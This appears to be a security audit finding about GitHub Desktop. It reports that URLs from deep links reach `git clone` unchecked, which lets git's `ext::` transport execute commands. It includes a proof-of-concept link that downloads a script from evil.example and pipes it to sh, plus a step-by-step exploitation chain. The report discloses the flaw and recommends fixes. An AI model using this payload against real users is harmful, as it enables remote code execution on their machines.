### Title
Deep-link-supplied clone URL reaches `git clone` unvalidated, allowing `ext::` transport command execution - (File: `app/src/lib/git/clone.ts`)

### Summary
GitHub Desktop registers the `x-github-client://openRepo/<url>` (and platform equivalents) protocol handler. The path segment after `openRepo/` is parsed by `parseAppURL` (`app/src/lib/parse-app-url.ts:66-127`) as a raw string and forwarded, with no protocol/scheme restriction, into the Clone Repository dialog and finally into `git clone`. Git supports the `ext::<command>` remote-helper transport, which executes an arbitrary shell command as part of "cloning." Because Desktop's clone path never validates that the URL is `http(s)://`, `ssh://`, or `git://`, a crafted deep link can smuggle an `ext::` URL through the UI and, once the (unwitting) user clicks "Clone," cause GitHub Desktop to execute attacker-controlled shell commands.

### Finding Description
1. `parseAppURL` extracts the `url` field from `github-mac://openRepo/<url>` / `x-github-client://openRepo/<url>` deep links with only cosmetic validation (`pr`, `branch`, `filepath` are checked; the `url` itself is not restricted in any way): [1](#0-0) 

2. `dispatcher.ts`'s `openRepositoryFromUrl` → `openOrCloneRepository` takes this attacker-controlled `url` and, if no matching repository is already open, shows the Clone dialog pre-filled with it: [2](#0-1) 

3. The Generic clone tab (`CloneGenericRepository`) is a plain text box — it does not parse, canonicalize, or restrict the value in any way: [3](#0-2) 

4. When the user proceeds, `resolveCloneInfo()` falls back to using the raw, unparsed string as the clone URL whenever it doesn't match the GitHub owner/repo regexes (which an `ext::...` string would not): [4](#0-3) 

5. `clone()` in `app/src/lib/git/clone.ts` only guards the *destination path* against sensitive locations (`isClonePathSensitive`); it performs **no validation of the URL's protocol/scheme** before building `git clone` arguments and invoking git: [5](#0-4) 

The broken invariant is: *the "remote source" value that reaches the git subprocess must be a network transport (https/ssh/git), never an arbitrary command.* Desktop's only hardening in this file is destination-path sanitization (`sanitizeCloneName`, `isClonePathSensitive`), which defends against path traversal but does nothing to stop the URL itself from being a command-execution transport string like `ext::sh -c "curl evil.sh|sh"`. The `--` separator before `url` in `args.push('--', url, path)` prevents `-`-prefixed flag injection, but it does not prevent git from recognizing the `ext::` scheme, since scheme dispatch happens on the value's contents, not on how argv parses leading dashes.

### Impact Explanation
If exploited, this results in arbitrary command execution on the victim's machine as soon as they confirm the Clone dialog — a direct violation of the "attacker controls a link the user clicks → code execution" impact category. This is comparable in severity to the DODO GSP finding in that a single unguarded state transition (an unrestricted attacker-controlled string flowing straight into a sensitive operation) turns a normal user action (clicking "Clone") into full compromise, and the existing guard (`isClonePathSensitive`) protects the wrong parameter (destination path) rather than the actually dangerous one (the URL/transport).

### Likelihood Explanation
Requires the victim to click a single external deep link and then confirm a clone action inside Desktop with a URL they may not carefully scrutinize (the field's placeholder text `"URL or username/repository"` does not hint at any risk, and the dialog does not display or warn about non-http(s)/ssh schemes). This matches the "link the user clicks" primitive explicitly listed as valid — no local access, no malware, no leaked credentials, and no unnatural steps beyond clicking a link and clicking "Clone" are required. Whether `protocol.ext.allow` in the victim's global gitconfig has been changed from git's default (`user`) is the only environmental variable, and since Desktop-initiated clones are the top-level, user-invoked git command (not an automatic submodule fetch), the "user" allow-level does **not** block the `ext::` transport here.

### Recommendation
Add scheme allow-listing in `app/src/lib/git/clone.ts` (or upstream when the URL is first accepted from `parseAppURL`/`CloneGenericRepository`) that rejects any clone URL whose scheme is not one of `https`, `http`, `ssh`, `git`, or `file` (with `file` further gated as already done for submodule updates via `allowFileProtocol`). Reject anything matching `^[a-z][a-z0-9+.-]*::` or an unrecognized scheme before ever reaching `git clone`, mirroring the destination-path hardening (`isClonePathSensitive`) that already exists for the path parameter.

### Proof of Concept
1. Attacker crafts and distributes a link: `x-github-client://openRepo/ext::sh%20-c%20%22curl%20https://evil.example/p.sh|sh%22`.
2. Victim (with GitHub Desktop installed and registered as the protocol handler) clicks the link.
3. `parseAppURL` parses `pathName` as `ext::sh -c "curl https://evil.example/p.sh|sh"` and returns an `open-repository-from-url` action with that string as `url` [6](#0-5) .
4. `openOrCloneRepository` opens the Clone dialog pre-populated with this string as the "Generic" clone URL [7](#0-6) .
5. Victim clicks "Clone." `resolveCloneInfo()` cannot resolve it as a GitHub owner/repo, so it is used verbatim [8](#0-7) .
6. `clone(url, path, options)` builds `git ... clone --recursive ... -- "ext::sh -c \"curl ...|sh\"" <path>` and executes it via `git(...)`, with no scheme check performed anywhere in the call chain [9](#0-8) .
7. Git's `ext` remote helper executes the embedded shell command on the victim's machine.

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
